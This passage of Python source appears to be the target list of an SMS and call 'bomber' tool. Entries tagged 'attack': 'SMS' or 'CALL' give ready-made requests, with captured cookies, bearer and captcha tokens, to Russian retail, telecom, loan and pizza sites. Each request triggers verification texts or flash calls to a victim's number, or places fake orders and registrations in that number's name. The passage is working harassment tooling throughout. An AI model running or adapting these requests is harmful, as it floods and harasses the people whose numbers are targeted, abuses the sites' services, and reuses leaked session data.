            'cookies': {'session-cookie': '176aaacb364596a69318265c80267f9300c223e06f2baf4566952d498917c999baf15915fd0a1b3c8b8cdb6fcbc9bea9', 'anonymous_user_cart': '', 'anonymous_user_last_viewed': '', 'anonymous_user_wishlist': '', 'anonymous_user_city': '', 'COOKIE-BEARER': 'eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1MTYxNjY4ODYzNDgiLCJhdXRob3JpdGllcyI6IlJPTEVfQU5PTllNT1VTIiwic2l0ZUlkIjoic3RvcmVNb2JpbGVSVSIsImlhdCI6MTY4NzM0ODgwMCwiZXhwIjoxNjg3NDM1MjAwfQ.nI-6QjpCjAQpnuqFuLy_ts7VmiAk50PK8SNEe7C9nCN4sKjdogPI0TC2iXcIRa1savbETMh_xpIs2bui_HHZzw', 'JSESSIONID': '6mMIsEn0TzjDnRwjUAIUduWdI_M_.letu-wru-01', 'language': 'ru-RU', 'cityDetected': 'true', 'ssaid': '1bbaa900-102b-11ee-830d-1f671d79a27d', '_ym_uid': '1687348783137585816', '_ym_d': '1687348783', '_ym_isad': '1', '_gid': 'GA1.2.425776780.1687348783', '_gat_ddm': '1', '_gcl_au': '1.1.1639315061.1687348783', '_ga': 'GA1.1.275320708.1687348783', 'cityGuessed': 'true', 'tmr_lvid': '547193bd8767af701bb1ca1c88bc5b7a', 'tmr_lvidTS': '1687348786231', 'tmr_detect': '1%7C1687348786243', 'st_uid': '3ab0fffa91d0b4b872216ffc59dc24da', 'iap.uid': '8ba4d1bdb2014b7881d2717b305d7837', '_userGUID': '0:lj5nwga9:MjM0xmxlmv7vS9fl9Q3gjwVZCHybk9Zf', 'uxs_uid': '1e081b70-102b-11ee-8b8f-1d4b35b3d95d', 'mindboxDeviceUUID': 'a737c82a-6ab1-418e-ad10-b91a28e943c3', 'directCrm-session': '%7B%22deviceGuid%22%3A%22a737c82a-6ab1-418e-ad10-b91a28e943c3%22%7D', 'flocktory-uuid': 'ed70e89d-e2ef-451b-a9bc-6edb8aa5c8a2-0', '_ym_visorc': 'b', '_gpVisits': '{"isFirstVisitDomain":true,"idContainer":"10002591"}', '_gp10002591': '{"hits":1,"vc":1}', '_rcmx_session': '29aaf947-a2d2-4a30-b126-42af008b998e', '__tld__': 'null', '_ga_72YB0DGLLG': 'GS1.1.1687348783.1.1.1687348799.44.0.0',},
            'headers': {'authority': 'www.letu.ru', 'accept': 'application/json, text/plain', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://www.letu.ru', 'referer': 'https://www.letu.ru/account/wishlist', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-ajax-token': '2c6c7ac5a8cc4474440bed713f6bc18f4d84ec54e23e75b04a7542c7ad89d18d', 'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw', 'x-requested-with': 'XMLHttpRequest',},
            'json': {'phoneNumber': f'+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}',},
            'params': {'pushSite': 'storeMobileRU', '_dynSessConf': '-6205963132693084487',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Beeline.tv', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://rest.beeline.tv/api_v3/service/ottUser/action/login',
            'headers': {'Accept': 'application/json', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-type': 'application/json', 'Origin': 'https://beeline.tv', 'Referer': 'https://beeline.tv/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'apiVersion': '4.7', 'ks': 'djJ8NDc4fJ67ssobdkgzEyRlKrgDESU-YNHlna35sk7SyuRFhdLCtyrgl3iPF7BZUeR1ZpoD0APNbOn6bmJT7XtFVFsxqZGZS2EuPgfhPM3cZrfqiS9vtK6d5ft3EkT3Z2Zy4RlEqQixOqyALefGLHBL6xq43LGFsKZATT-V3TUBPrXmCuYIaBz-O_Yiift7G6g8qIeatVH9tStZ_IC0zvp9gksXdTkWMQlJxZ0rZD_XrKTJ127xmkBPZEQ0vvR7-4VISBTxPDrMVVk1rr8yllcNnj3ZGmd8wxlkBdMK0JPiJYX17nxS7MZK9VADGBGywnd7x0deyB07ftfpgsONgq59oX4GE7A=', 'username': str(number)[1:], 'password': '123456', 'udid': '4FECD4C72FDF2D28', 'partnerId': '478', 'extraParams': {'devicedetails': {'value': '{"tveversion":"12.8.1","family":"pcmac","manufacturer":"Windows 10","model":"Yandex 23 (23.5.2.625)","osversion":null,"serialnumber":null}', 'objectType': 'KalturaStringValue',}, 'loginType': {'value': 'mobileConnectInit', 'objectType': 'KalturaStringValue',}, 'brandID': {'value': '22', 'objectType': 'KalturaStringValue',},},},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Turbozaim.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://operator.turbozaim.ru:88/api/registration/sendCode',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://lk.turbozaim.ru', 'Referer': 'https://lk.turbozaim.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'refSources': '{"1687691835":{"time":1687691835,"referal":"utm_source=ecpander&utm_medium=affiliate&utm_campaign=turbozaim&wmid=125100&transaction_id=39e0567cea3de248b7f3289ab2af6643","url":"turbozaim.ru\\/form4\\/?utm_source=ecpander&utm_medium=affiliate&utm_campaign=turbozaim&wmid=125100&transaction_id=39e0567cea3de248b7f3289ab2af6643"}}', 'firstName': 'Гыук', 'lastName': 'Гыукк', 'middleName': '', 'email': email(), 'birthDate': '1991-11-11', 'phone': f'+7 ({str(number)[1:4]}) {str(number)[4:7]} {str(number)[7:9]} {str(number)[9:]}', 'genderId': '', 'insuranceDisablingExperimentValue': 'A', 'captchaV3': '03AL8dmw-XS6wVVIe6IpHfxMx6dmZSF45J4rpEp2lnR2j3u3NRYA37cMBJhmlbmfmlEJIkNRWx3SzZ9hfB5eICCgQ3EhdeVpUhbZ0Tt8HjrAZaulPMYWXqpl1ZTCE0coSi3AHsOby4JBrTZKiNAkVhfwPacnOFwLCqabNcmgWv4O_MQ6_z9dB6_W_a7K-PkFAXx_bJfIkw6IIMVzAdSGhCv29WRT9JRhAKEdWLfQdryt2dkLwGjh0daUXMTFXPa87LFUjfkHqwVevohUFF1-kB2C7DuqFqvViyKQsdIYQku2_qZQoV7aAFthPaViTuaR63JdWagAuA-NizjNFR6Qe5TeEVWsLQeVHS33DpwZQ3_OIvtuEM4nmVDmfzeoxiaUF7g9K2G8sKwWnzXwWlPY4jnRgIEt7u4-rp9qEs1Qm-cFM3jQZ_EbY1pAjfG8MsQJHWCKFLg6acsujDlaGMLit1v-Dj7jLLie4rRh89rKoN4DKAzAQZ69yk26n_Tx5h0qpQzSCVZlkUkxpjokTrzZ4wbmfJDj0S-4LUJA',},
        },



        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'KCentr.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kcentr.ru/user-service/api/desktop/v1/send-flash-call',
            'headers': {'authority': 'kcentr.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://kcentr.ru', 'referer': 'https://kcentr.ru/?utm_source=yandex&utm_medium=cpc&utm_campaign=adv_brend_search_keywords_world-~otuxmgu3&utm_term=%D0%BA%D0%BE%D1%80%D0%BF%D0%BE%D1%80%D0%B0%D1%86%D0%B8%D1%8F%20%D1%86%D0%B5%D0%BD%D1%82%D1%80&utm_content=42246882592_42246882592%7Ccid%7C80878824%7Cgid%7C5083530682%7Caid%7C13122062162%7Cadp%7Cno%7Cpos%7Cpremium1%7Csrc%7Csearch_none%7Cdvc%7Cdesktop%7Crgnid%7C10335%7Crgn%7C%D0%A2%D0%B0%D1%88%D0%BA%D0%B5%D0%BD%D1%82%7Cproduct%7Cb2c%7Caudience%7Cbrand%7Cad_format%7Ctext&_openstat=ZGlyZWN0LnlhbmRleC5ydTs4MDg3ODgyNDsxMzEyMjA2MjE2Mjt5YW5kZXgudXo6cHJlbWl1bQ&yclid=12487662104079761407', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'visitorUuid': 'fd4764aa-c9c9-431f-bdfe-f0218569cd65', 'cityUuid': 'deb1d05a-71ce-40d1-b726-6ba85d70d58f', 'phone': f'+{number}',},
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'TashirPizza.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kcentr.ru/user-service/api/desktop/v1/send-flash-call',
            'cookies': {'__lhash_': 'cd9bf5fa4974786a6df6d154da277621', '_gid': 'GA1.2.1483796065.1677961924', '_ym_uid': '1672947102582579075', '_ym_d': '1677961924', '_ym_isad': '1', 'tashir_vps': 'ecs0fbgaoocrb534l25r2tcao3', 'city_id': '1', '_gat_UA-163981186-1': '1', '_ga': 'GA1.1.884344881.1677961924', '_ga_GKW2YSN7N0': 'GS1.1.1678002112.2.1.1678002129.43.0.0',},
            'headers': {'authority': 'tashirpizza.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'cookie': '__lhash_=cd9bf5fa4974786a6df6d154da277621; _gid=GA1.2.1483796065.1677961924; _ym_uid=1672947102582579075; _ym_d=1677961924; _ym_isad=1; tashir_vps=ecs0fbgaoocrb534l25r2tcao3; city_id=1; _gat_UA-163981186-1=1; _ga=GA1.1.884344881.1677961924; _ga_GKW2YSN7N0=GS1.1.1678002112.2.1.1678002129.43.0.0', 'origin': 'https://tashirpizza.ru', 'referer': 'https://tashirpizza.ru/account', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'phone={number}',
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'CityStarwear.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php',
            'cookies': {'PHPSESSID': 'iiKCdeS0Iyq75BsMInq1lI5Il55fw22b', 'I_BITRIX2_SM_bsSiteVersionRun': 'D', 'I_BITRIX2_SM_SALE_UID': '3eb77cb9cce668992fb4b8aecd77f6b9', '_ym_uid': '1677955452713110116', '_ym_d': '1677955452', '_ga': 'GA1.2.1158728733.1677955452', '_gid': 'GA1.2.1002292035.1677955452', '_gat': '1', '_gat_gtag_UA_107697781_1': '1', '_ym_visorc': 'w', 'tmr_lvid': '5839241cca0b255c8c20c708eee183a2', 'tmr_lvidTS': '1677955452362', '_ym_isad': '1', 'BX_USER_ID': '762dcf2af222904b94c5bdf2f323e544', 'I_BITRIX2_SM_BSPopUpBnr': '%7B%2298263%22%3A1678041855%7D', 'I_BITRIX2_SM_bsAuthPhone': '7%239249518462', 'tmr_detect': '1%7C1677955483285',},
            'headers': {'authority': 'citystarwear.com', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://citystarwear.com', 'referer': 'https://citystarwear.com/lk/profile/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'phone': str(number)[1:], 'hdlr': 'bsSendCallCode', 'key': 'DOvBhIav34535434v212SEoVINS', 'dataForm[phone]': '9249518462', 'dataForm[callNums]': '', 'dataForm[smsCode]': '', 'dataForm[email]': '', 'dataForm[ecode]': '', '4YreJ': 'niKOC7pJmi1BET3puazqvly5E', 'tTCwJ': 'nLYUqjASgdo3mKNoGxLNOQrIU', 'fiGED': 'gww88r5FPtbfCTLxYknQCt47t', 'dyzOM': 'y10RWRSMhFnc1JrxETX96Fu8C', 'VvYbo': '0Ui38ZF9FWGIpmT55oux1K3AV', '6jOgK': '8LBnrkukNu9tkFSp3HsbkgKS9', 'rOzgC': 'Yx4lA7UOIScs997ucA0zJau8k', 'ocRHN': '7itJktUZCsUekX7IKJC3CkC4B', 'jmzjN': 'm5TqxQurYfN6g5coZLNMf512L', 'eQhnD': 'AhYFKa8XHZsAPtrxclwJbKFSh',},
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'PizzaPizzBurg.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://pizzapizzburg.ru/korzina.html',
            'cookies': {'SN5293e41181caa': 'd8c6c03a71235ff56e0c14003b8f21b3', 'subscribeshow': '1', '_ga': 'GA1.2.1205085698.1678014332', '_gid': 'GA1.2.991129440.1678014332', '_ym_uid': '1678014343547221031', '_ym_d': '1678014343', '_ym_isad': '1', '_gat_gtag_UA_49378075_1': '1',},
            'headers': {'authority': 'pizzapizzburg.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'cache-control': 'max-age=0', 'origin': 'https://pizzapizzburg.ru', 'referer': 'https://pizzapizzburg.ru/korzina.html', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': {'formid': 'shopOrderForm', 'reportTpl': 'shopOrderReport', 'name': 'Юзер', 'tel': number, 'delivery': '2', 'ulitsa': 'Белкина 7', 'dom': '51', 'ofis': '', 'podezd': '', 'kvartira': '', 'message': '', 'oplata': 'курьеру наличными', 'sdacha': '', 'submit': 'Оформить заказ',},
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Rp55.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://rp55.ru/wp-json/contact-form-7/v1/contact-forms/11/feedback',
            'cookies': {'_ga': 'GA1.2.1240489818.1678014319', '_gid': 'GA1.2.2081399586.1678014319', '_ym_uid': '167801432764205566', '_ym_d': '1678014327', 'tmr_lvid': '948400185cebd0555227de58ff3df8e3', 'tmr_lvidTS': '1678014327737', '_ym_isad': '1', 'tmr_detect': '1%7C1678014328081', '_ym_visorc': 'w',},
            'headers': {'authority': 'rp55.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryyEWJSbKUjwRmT6Jy', 'origin': 'https://rp55.ru', 'referer': 'https://rp55.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'------WebKitFormBoundaryyEWJSbKUjwRmT6Jy\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n11\r\n------WebKitFormBoundaryyEWJSbKUjwRmT6Jy\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.1.4\r\n------WebKitFormBoundaryyEWJSbKUjwRmT6Jy\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nru_RU\r\n------WebKitFormBoundaryyEWJSbKUjwRmT6Jy\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f11-o1\r\n------WebKitFormBoundaryyEWJSbKUjwRmT6Jy\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n0\r\n------WebKitFormBoundaryyEWJSbKUjwRmT6Jy\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\n03AFY_a8X5Mcp4tVr8nmoNBpwXVCWk4PgHopBqG-bXQqGfAV3ePUcFAGtYQLw8-WWDP6kdk-9Yn0c4_WxElUoDt8zPKgO2SviahwDlfq5SdUDMM89rr0OWYFjmwUs-R-60I2CQLf71kFfbZNuGk0LYsw8tCb42jKHbe8o1mHO6i2dqIujZOJyfruz8e_R_uWRWfOGkb2aY0LMceaJUr-ijtAdJO162leEoaYcioviWJ_pU-W9aAL5oHRuKxKqyCYylXccuTbVIjXL0uOpGHn2Jl9JM_cFAnl9TKBiKGEoOa5YYn_SlSD7yHBqvjyD-7G34pbE2pDkD9hQWZ2germzE5DN01LgSv_9g562DBOgHSgWxtMTg-NRbpAK53k-9OMi0CqvZkEshVN7cdLSinzUZFsb6d6CDp4uJugToz9SIwFp3BMDUjLwpwGzerky-KDXJHbrr9IRWk1iEvTxwF6Fwdgk08m2HiVgYy59gEblbCnYHaIKERc5D-yD3ywDZmesgB8iBZuMezee-\r\n------WebKitFormBoundaryyEWJSbKUjwRmT6Jy\r\nContent-Disposition: form-data; name="text-12"\r\n\r\nЮзер\r\n------WebKitFormBoundaryyEWJSbKUjwRmT6Jy\r\nContent-Disposition: form-data; name="tel-239"\r\n\r\n{number}\r\n------WebKitFormBoundaryyEWJSbKUjwRmT6Jy--\r\n'.encode(),
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Aleksandrov.MyPizza-1.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://aleksandrov.mypizza-1.ru/ajaxform/action.php',
            'cookies': {'_ym_uid': '1678011958255673504', '_ym_d': '1678011958', '_ga': 'GA1.2.1007982980.1678011958', '_gid': 'GA1.2.273847487.1678011958', '_ym_isad': '1', '_ym_visorc': 'w', 'PHPSESSID': '0cd471d64067388b62aef4564aa31579', 'cityid': '581', 'orderListCount': '0',},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://aleksandrov.mypizza-1.ru', 'Referer': 'https://aleksandrov.mypizza-1.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'phone': str(number)[1:], 'af_action': '2599def63b422b00d2a3174b10665088', 'pageId': '891',}
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'Vsem-Edu-Oblako.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://vsem-edu-oblako.ru/ajax',
            'cookies': {'__lhash_': 'ebe376884ec1c9209c9e017de8fe0624', 'PHPSESSID': 'ff4637069e12bf0fa7403c753a3c9b5e', '_ym_uid': '167801232436365596', '_ym_d': '1678012324', '_ga': 'GA1.2.272532517.1678012324', '_gid': 'GA1.2.282926778.1678012324', '_gat': '1', '_ym_visorc': 'w', '_ym_isad': '1',},
            'headers': {'authority': 'vsem-edu-oblako.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0NTM1MjEiLCJhcCI6IjMyODAxMDQ2OCIsImlkIjoiNTUzOTVjY2NjOTE2ODE2NCIsInRyIjoiNjBlNzVkMzQ2MDA0NjljMGUxMmY4YzBjMGQyMjE3NzAiLCJ0aSI6MTY3ODAxMjM2MDA2NH19', 'origin': 'https://vsem-edu-oblako.ru', 'referer': 'https://vsem-edu-oblako.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'traceparent': '00-60e75d34600469c0e12f8c0c0d221770-55395cccc9168164-01', 'tracestate': '3453521@nr=0-1-3453521-328010468-55395cccc9168164----1678012360064', 'user-agent': user_agent()[1], 'x-newrelic-id': 'VwICUlNRCRADVVlQAwcHVVQ=', 'x-requested-with': 'XMLHttpRequest',},
            'data': f'action=actionMerchantSignupNewCheck&currentController=store&contact_name=User+Name&contact_phone={number}&contact_email={email()}&password=drf-HdY-pEb-mnS&cpassword=drf-HdY-pEb-mnS&agree=true&yii_session_token=ff4637069e12bf0fa7403c753a3c9b5e&YII_CSRF_TOKEN=8e34a2a3590650b3d332c10d257a81740c3aa55a&token=03AFY_a8VukXqwUh0xjwAwtLggo7PKTO4iyKYuhihw5NnLFKvCrciUMsKHoWBMbRAKG6866qUjg5Kmc8HFJvCv9kH7YiaqIKrUqBVp6NWBKTMk-Y9Cz_zIJjnNorPuSfQN2Y4uVn2bekd9K65OQZKBX0Lfpxk3_H262-yudHr7aIB0ihbSYAjtk4D_YQngyESKrXDel0MYkHOdOqCwBoJCatjzWrK8RMAGMVCfHGwqLs42xb8XWCCUWDN1OsAHfYJ9W3L9IINu_iF6vNJttEs8ad0TSKcz9-x-16uycC3Dl6buA2X4aqs0gv_r3vHpvDUaelloFNUuWKvoXCRlxZRac-7rrfZGoq0nwLT7Y5W_FX5dZeB6r-9si15ooPGy5aGO5cUxd8BzGtklygWlFXFPZigTyDvMuqQkEYvNvodLmJi0aCahT1xaLugMOtEtNEm_6qQPqioTOxHzBJhmbqghv2YUPJT6Ncz1PcOebM2kGyReRwjtYGtZ0CZpa9D7GwjD5H9cBt1t4hce&',
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'NinjaPizza.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://ninjapizza.ru/local/ajax/auth.php',
            'cookies': {'PHPSESSID': 'fb0797f8fc27c2155ac4c8f946b8eea1', 'BITRIX_SM_SALE_UID': 'c9f11689eec5099587621ddd0e244b42', 'mindboxDeviceUUID': '22e7e04d-0b25-40a1-b84c-04404e423a23', 'directCrm-session': '%7B%22deviceGuid%22%3A%2222e7e04d-0b25-40a1-b84c-04404e423a23%22%7D', 'roistat_visit': '2289795', 'roistat_first_visit': '2289795', 'roistat_visit_cookie_expire': '1209600', 'roistat_is_need_listen_requests': '0', 'roistat_is_save_data_in_cookie': '1', 'mgo_sb_migrations': '1418474375998%253D1', 'mgo_sb_current': 'typ%253Dreferral%257C%252A%257Csrc%253Dyandex.uz%257C%252A%257Cmdm%253Dreferral%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%252F%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529', 'mgo_sb_first': 'typ%253Dreferral%257C%252A%257Csrc%253Dyandex.uz%257C%252A%257Cmdm%253Dreferral%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%252F%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529', 'mgo_sb_session': 'pgs%253D1%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fninjapizza.ru%252F', 'mgo_uid': 'EbIWk0XymlDdfzCteDcH', 'mgo_cnt': '1', 'mgo_sid': 'e5fmrr1vi611001thwsj', 'tmr_lvid': '3ac50a3820bf8732f0cba30cce9ae923', 'tmr_lvidTS': '1678023882151', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', 'roistat_marker': 'seo_yandex_', 'roistat_marker_old': 'seo_yandex_', 'leadhunter_expire': '1', '_ym_uid': '1678023883227621567', '_ym_d': '1678023883', 'tmr_detect': '1%7C1678023883089', '_ym_isad': '1', '_ym_visorc': 'w', '___dc': 'b2e71e44-7b12-4e55-86e2-9b67136fca68', 'roistat_leadHunterScriptsShownCount': '%7B%22undefined%22%3A1%7D', 'isScrollRoistat': '1', 'roistat_leadHunterCaught': '1', 'roistat_cookies_to_resave': 'roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_marker%2Croistat_marker_old%2Cleadhunter_expire%2Croistat_leadHunterScriptsShownCount%2Croistat_leadHunterCaught',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://ninjapizza.ru', 'Referer': 'https://ninjapizza.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'action=sendConfirmCode&phone={number}',
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'SuperPizzaPlus.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://superpizzaplus.ru/profile/auth/login/',
            'cookies': {'PHPSESSID': '64ctr9nobsrcgjghibriq2bhf1', 'active_region': 'orel', 'active_region_id': '1', '_ym_uid': '1678022239385725797', '_ym_d': '1678022239', '_ym_visorc': 'w', '_ga': 'GA1.2.116127243.1678022239', '_gid': 'GA1.2.1009382803.1678022239', '_ym_isad': '1', 'BX_USER_ID': '46b3c5edadebcef179de02db38e83aee', 'active_region_clicked': '1', '_gat_gtag_UA_152538837_1': '1',},
            'headers': {'authority': 'superpizzaplus.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://superpizzaplus.ru', 'referer': 'https://superpizzaplus.ru/profile/auth/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'token=03AFY_a8WeCfEiaLdJVgVlH8zGK1D6gNy9L2Yrw-sSl_fFOqhYYdr4wSq7U63qWbo0mkG8KyXdhG-_TurooWv3pznA5melrw07IsZL3O9lkjUPoQCZ5T9aaolCGt64tA1o5qEIKvxQBxaBfHvyhbg3XrgBp-5N4ae2LGFIzO5gp5r7XV8A686_O33qfYFDgjLDbrczcbL6HuWKoGcCJWbjN3PubmXYSgWRcBcw9JSynyhGG4zd9s6uizAMINWZJI76tH_Wj1KEUdidKepmVKyYc0NHZ_UjEh-WrystPhXie2ggiKGKGMfQ5bJ988DJ_sdOSsXzrHsi54IwIzCM3FttetRUg_Bj0T_nZQA1dnLiyX73gwadjjsHWwjsOMTkfauKO63HpW4vvY5vi4kjr8JaVsdOua_adla2Yf2LBftBkOcywrF6H7HcFGTL10rFulkSgJX_3VpcQHWJMTE53W5vyrMHYYHGin90YWCMlIPXUBA08r-DkSG5ScbH9INlLnMvd291JRHgfV_k_1efjwqaXpnMxqS7l5q0ow&phone={number}&code=&m%5BPERSONAL_AGREEMENT%5D=on',
        },
        {
            'info': {'country': 'RU', 'attack': 'CALL', 'website': 'HappyWear.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckEmail',
